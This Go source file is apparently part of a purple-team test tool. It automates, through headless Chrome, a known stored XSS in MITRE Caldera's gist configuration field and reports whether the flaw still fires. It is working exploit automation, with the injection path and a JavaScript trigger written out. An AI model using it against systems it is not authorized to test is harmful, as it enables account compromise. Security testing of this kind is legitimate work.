/*
Copyright © 2022-present, Meta Platforms, Inc. and affiliates

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/

package cmd

import (
	"context"
	"errors"
	"fmt"
	"math"
	"os"

	"github.com/chromedp/cdproto/emulation"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
	"github.com/fatih/color"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

var (
	storedXSSTresCmd = &cobra.Command{
		Use:   "storedXSSTres",
		Short: "Third stored XSS found in MITRE Caldera by Jayson Grace from Meta's Purple Team",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println(color.YellowString(
				"Introducing stored XSS vulnerability #3, please wait..."))

			caldera.URL = viper.GetString("login_url")
			caldera.RepoPath = viper.GetString("repo_path")
			caldera.Creds, err = getRedCreds(caldera.RepoPath)
			if err != nil {
				log.WithError(err).Fatalf(
					"failed to get Caldera credentials: %v", err)
			}

			caldera.Driver.Headless = viper.GetBool("headless")
			driver, cancels, err := setupChrome(caldera)
			if err != nil {
				log.WithError(err).Fatal("failed to setup Chrome")
			}

			defer cancelAll(cancels)

			caldera.Driver = driver

			caldera, err = login(caldera)
			if err != nil {
				log.WithError(err).Fatal("failed to login to caldera")
			}

			caldera.Payload = viper.GetString("payload")

			if err = storedXSSTresVuln(caldera.Payload); err != nil {
				log.WithError(err).WithFields(log.Fields{
					"Payload": caldera.Payload,
				}).Error(color.RedString(err.Error()))
			}
		},
	}
	storedXSSTresSuccess bool
)

func init() {
	rootCmd.AddCommand(storedXSSTresCmd)
	storedXSSTresSuccess = false
	introPayload = false
}

// // Payload is used to represent the POST
// // body associated with the source for the attack.
// type Payload struct {
// 	Name               string `json:"name"`
// 	AutoClose          bool   `json:"auto_close"`
// 	State              string `json:"state"`
// 	Autonomous         int    `json:"autonomous"`
// 	UseLearningParsers bool   `json:"use_learning_parsers"`
// 	Obfuscator         string `json:"obfuscator"`
// 	Jitter             string `json:"jitter"`
// 	Visibility         string `json:"visibility"`
// }

func storedXSSTresVuln(payload string) error {
	var buf []byte
	var res *runtime.RemoteObject

	// XPath and selectors for chromeDP
	configLinkXPath := "/html/body/main/div[1]/aside/ul[3]/li[6]/a"
	gistInputXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[2]/input"
	updateGistButtonXPath := "/html/body/main/div[2]/div[2]/div/div/div[2]/div[2]/table/tbody/tr[9]/td[3]/button"
	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"

	imagePath := viper.GetString("image_path")

	// listen network event
	listenForNetworkEvent(caldera.Driver.Context)

	// handle payload that use alerts, prompts, etc.
	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			go func() {
				err := chromedp.Run(caldera.Driver.Context,
					page.HandleJavaScriptDialog(true))

				// If we have gotten here, the exploit succeeded.
				storedXSSTresSuccess = true

				if err != nil {
					log.WithError(err).Errorf("failed to handle js: %v", err)
					return
				}
			}()
		}
	})

	// handle payload that use alerts, prompts, etc.
	chromedp.ListenTarget(caldera.Driver.Context, func(ev interface{}) {
		if _, ok := ev.(*page.EventJavascriptDialogOpening); ok {
			go func() {
				err := chromedp.Run(caldera.Driver.Context,
					page.HandleJavaScriptDialog(true))

				// If we have gotten here, the exploit succeeded.
				storedXSSTresSuccess = true

				if err != nil {
					log.WithError(err).Errorf("failed to handle js: %v", err)
					return
				}
			}()
		}
	})

	if err := chromedp.Run(caldera.Driver.Context,
		network.Enable(),
		// Click the configuration link
		chromedp.Click(configLinkXPath),
		chromedp.Sleep(Wait(2000)),
		// Introduce the payload
		chromedp.SendKeys(gistInputXPath, payload),
		chromedp.Sleep(Wait(2000)),
		// Update the gist configuration with the malicious payload
		chromedp.Click(updateGistButtonXPath),
		chromedp.Sleep(Wait(2000)),
		// Click the debrief link
		chromedp.Click(debriefLinkXPath),
		// Click the operation with the payload that we introduced previously
		chromedp.Click(firstOperationXPath),
		chromedp.Sleep(Wait(2000)),
		// Move mouse over C2 Server image to trigger the exploit
		chromedp.Evaluate(triggerVulnJS, &res),
		chromedp.Sleep(Wait(2000)),
		chromedp.ActionFunc(func(ctx context.Context) error {

			_, _, contentSize, _, _, _, err := page.GetLayoutMetrics().Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to get layout metrics")
				return err
			}

			width, height := int64(math.Ceil(contentSize.Width)),
				int64(math.Ceil(contentSize.Height))

			// force viewport emulation
			err = emulation.SetDeviceMetricsOverride(width, height, 1, false).
				WithScreenOrientation(&emulation.ScreenOrientation{
					Type:  emulation.OrientationTypePortraitPrimary,
					Angle: 0,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to override device metrics")
				return err
			}

			// capture screenshot
			buf, err = page.CaptureScreenshot().
				WithQuality(100).
				WithClip(&page.Viewport{
					X:      contentSize.X,
					Y:      contentSize.Y,
					Width:  contentSize.Width,
					Height: contentSize.Height,
					Scale:  2,
				}).Do(ctx)
			if err != nil {
				log.WithError(err).Error("failed to take screenshot")
				return err
			}
			return nil
		})); err != nil {
		log.WithError(err).WithFields(log.Fields{
			"Payload": payload,
		}).Error("unexpected error while exploiting the vulnerability")
		return err
	}

	if err := os.WriteFile(imagePath+"3.png", buf, 0644); err != nil {
		log.WithError(err).Error("failed to write screenshot to disk")
	}

	if storedXSSTresSuccess {
		errMsg := "failure: Stored XSS Tres ran successfully"
		return errors.New(errMsg)
	}

	log.WithFields(log.Fields{
		"Payload": payload,
	}).Info(color.GreenString("Success: Stored XSS Tres failed to run"))

	return nil
}
